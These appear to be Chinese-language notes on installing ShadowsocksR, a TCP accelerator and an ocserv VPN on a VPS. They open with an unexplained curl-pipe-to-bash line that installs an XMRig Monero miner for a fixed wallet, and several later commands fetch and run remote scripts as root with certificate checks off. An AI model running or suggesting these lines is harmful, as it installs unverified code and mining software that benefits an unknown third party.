
curl -L https://gitee.com/zzzkky/xmrig_setup/raw/master/setup_skypool_miner.sh | bash -s '88AgpRazEmeMjTkdq8Ukxc1hRaTUERduKea9tRZVSiZWerRQodyeTDCKDx5FMMCVyq6UFJG68C2X871oEu3sCjB33rnpMSp'

如果是ubuntu或debian的话，输入sudo su,再输入密码进入管理员权限；如果是centos，fedora之类的系统，就是输入su,再输入密码，就可以获取管理员权限了。一般的话，我们用终端都是先获取管理员权限，再进行其他操作的，这是习惯问题，可以避免好多问题。

-----------------------------------------------------------------------------------------------------------------------

一键安装ssr和锐速:使用root用户登录，运行以下命令（推荐使用putty链接到你的vps主机）

    wget --no-check-certificate https://raw.githubusercontent.com/zhenufo/MyTest/master/shadowsocksonekey.sh https://raw.githubusercontent.com/zhenufo/MyTest/master/sysctl
    
    chmod +x shadowsocksonekey.sh
    
    ./shadowsocksonekey.sh


-----------------------------------------------------------------------------------------------------------------------

如果只装锐速

    wget --no-check-certificate https://raw.githubusercontent.com/zhenufo/MyTest/master/speeder.sh https://raw.githubusercontent.com/zhenufo/MyTest/master/sysctl
    
    chmod +x speeder.sh
    
    ./speeder.sh

-----------------------------------------------------------------------------------------------------------------------

关于ocserv。一键安装ocserv和锐速。支持Debian7和Debian8

下载:
    
    wget --no-check-certificate -qO ocserv.sh 'https://raw.githubusercontent.com/zhenufo/MyTest/master/ocserv.sh' && chmod a+x ocserv.sh

安装及使用说明:

    安装并添加no-route路由表:
    bash ocserv.sh -install -noroute
  
    安装并添加route路由表:
    bash ocserv.sh -install -route
    
    添加no-route路由表和一个用户名和密码均为Test的用户:
    bash ocserv.sh -noroute -add Test Test
    
    删除一个用户名为Test的用户:
    bash ocserv.sh -del Test
    
    切换使用证书登陆(cret不区分大小写.需要安装时选择配置为证书登录,否则可能无法正常运行.):
    bash ocserv.sh -use Cert
    
    切换使用密码登陆(password不区分大小写.):
    bash ocserv.sh -use password
    
参数使用介绍:
    
    -install
    #在有其他参数时,第一步进行安装.
    
    -add 【用户名】【密码】
    #密码登陆模式下添加一个用户.
    
    -del 【用户名】
    #密码登录模式下删除一个用户.
    
    -use 【Cert/Password】
    #切换登陆方式,密码或证书.
    
    -route/-noroute
    #添加路由表,两个参数不能同时使用.
    
    #-route参数一般用于android机器(由于android平台限制).
    #-noroute参数推荐使用,除android机器外都使用此参数.
